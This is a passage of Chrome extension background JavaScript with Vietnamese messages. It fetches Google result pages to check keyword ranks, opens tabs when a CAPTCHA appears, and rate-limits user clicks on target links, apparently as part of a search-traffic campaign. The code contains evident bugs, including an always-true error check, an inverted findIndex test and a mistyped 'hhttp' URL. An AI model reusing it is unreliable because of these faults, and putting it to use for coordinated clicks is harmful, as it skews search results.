        "&safe=off&num=100&start=0&oe=utf-8&pws=0&hl=vi&_=" +
        new Date().getTime();

      (async (request) => {
        try {
          fetch(link_url)
            .then((response) => {
              if (!response.ok) {
                throw response;
              } else {
                return response.text();
              }
            })
            .then((text) => {
              if (text != "" && text != null && text != undefined) {
                sendResponse({
                  key_id: request.detail.id,
                  html: text,
                  mobile: request.detail.mobile,
                  project: request.detail.project,
                });
              } else {
              }
            })
            .catch((error) => {
              if (error.status == 0 || true) {
                if (request.is_incognito) {
                  chrome.windows.create(
                    {
                      url: link_url,
                      incognito: false,
                      focused: true,
                      type: "popup",
                    },
                    (tab) => {
                      if (
                        getcapchatab.findIndex((item) => item.link != link_url)
                      ) {
                        getcapchatab.push({ id: tab.id + 1, link: link_url });
                      }
                    }
                  );
                } else {
                  chrome.tabs.create(
                    {
                      url: link_url,
                      selected: true,
                    },
                    function (tab) {
                      if (
                        getcapchatab.findIndex((item) => item.link != link_url)
                      ) {
                        getcapchatab.push({ id: tab.id, link: link_url });
                      }
                    }
                  );
                }
                hdgTab.forEach((tab_index) => {
                  chrome.tabs.sendMessage(tab_index, {
                    action: "captcha_error",
                  });
                });
              }
            })
            .finally(() => {
              vuseragent = navigator.userAgent;
            });
        } catch (error) {}
      })(request);
      return true;
    }
    if (request.type == "change-max-open-tab") {
      configMaxTab = request.value;
    }

    if (request.type == "query-max-open-tab") {
      sendResponse(configMaxTab);
    }
    // end check rank key

    if (!sender.tab) {
      return;
    }
    var tab = sender.tab;
    var managedTab = TMG.getAnElementById(tab.id);
    if (!managedTab) {
      return;
    }
    if (!request.originMgs) {
      request.originMgs = trim(
        request.originMgs || request.text || request.keyword || ""
      );
    }
    if (request.text) {
      request.text = HP.rm_unicode(request.text);
    }
    /**
     |---------------------------------------------------------------------
     | Can not know redirected link. So we do this: setLastedUrl
     |---------------------------------------------------------------------
     */
    if (request.cmd === "click") {
      let openerTab = TMG.getAnElementById(sender.tab.id);
      openerTab.iNumberTabOpened++;
    }
    TMG.setLastedUrl(request);
    if (TMG.checkMasterTab(managedTab)) {
      if (request.cmd === "focusTab") {
        TMG.findTabHasUrlAndFcusIn(request);
        return;
      }

      TMG.dictMasterUrls[request.href] = request;
    } else if (TMG.checkfirtLlTab(managedTab) || TMG.SecondLlTab(managedTab)) {
      TMG.dictOpenedLevelUrls[request.href] = request;
      if (request.cmd === "openTab") {
        var openerTab = TMG.getAnElementById(sender.tab.id);

        if (HP.checkGGTab(sender) && !TMG.validateOpFrGGTab(sender, request)) {
          sendResponse({
            status: 0,
            mgs: "Bạn click sai domain hoặc chưa click link nháy nháy.",
          });
          return;
        }

        if (TMG.isTabOpen(request.href)) {
          sendResponse({ status: 0, mgs: "Tab này đang được mở." });
          return;
        }
        var iNumberTabOpened = TMG.checkTabOpenTooMuch(sender.tab.id);

        if (iNumberTabOpened) {
          sendResponse({
            status: 0,
            mgs: "Bạn đã mở nhiều hơn " + iNumberTabOpened + " tab.",
          });
          return;
        }
        if (dif0 < configTimeOpenTab || currentTab > configMaxTab) return;
        openerTab.iNumberTabOpened++;

        let sec = (new Date(request.time) - lasttabOpen) / 1000;

        if (sec > configTimeOpenTab) {
          lasttabOpen = new Date(request.time);
          sendResponse({
            status: true,
            sec: sec,
          });
        } else {
          sendResponse({
            status: false,
            sec: sec,
          });
        }

        return;
      }
    }

    if (request.cmd === "createdTab") {
      chrome.tabs.onCreated.addListener(function (tabInfo) {
        TMG.Add1Tab(tabInfo);
      });
    }

    if (request.cmd === "openTab") {
      try {
        if (TMG.isTabOpen(request.href)) {
          return;
        }

        if (
          sender.tab.id != null &&
          sender.tab.id != undefined &&
          dif0 > configTimeOpenTab &&
          currentTab < configMaxTab
        ) {
          let sec = (new Date(request.time) - lasttabOpen) / 1000;
          if (sec > configTimeOpenTab) {
            lasttabOpen = new Date();

            sendResponse({
              status: true,
              sec: sec,
            });
          } else {
            sendResponse({
              status: false,
              sec: sec,
            });
          }
          return;
        }
      } catch (e) {}
      return;
    }
  });

  TMG.AuOpTab();

  function GetTime(time) {
    HP.getlasttimeclick(time);
  }

  function HPkeyhighlight(key, a) {
    key = key.replace(/\[|\]|"/g, "");
    var arraykey = key.split(",");
    HP.keyhighlight(arraykey, a);
  }

  function trim(str) {
    return str.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
  }
  // function HpAtoOpTab() {
  //   HP.AuOpTab();
  // }
  // function HpScrBottom() {
  //   HP.autoScrollBottom();
  // }

  TMG.CountTab = function () {
    chrome.tabs.query({}, function (results) {
      currentTab = results.length;
    });

    setTimeout(TMG.CountTab.bind(this), 30000);
  };
  TMG.CountTab();
  chrome.runtime.onInstalled.addListener(({ reason }) => {
    if (reason === "install") {
      chrome.tabs.query({ active: false }, function (tabs) {
        tabs.forEach((tab) => {
          const tabUrl = tab.url;
          if (tabUrl.startsWith("hhttp://localhost:3000")) {
            chrome.tabs.reload(tab.id);
          }
        });
      });
    }
  });
} catch (e) {
  // console.log (e);
}
chrome.runtime.onMessage.addListener(({ reason }) => {
  if (reason === "install") {
    chrome.tabs.create({
      url: "https://www.facebook.com/hoangphuc.1999",
    });
  }
});
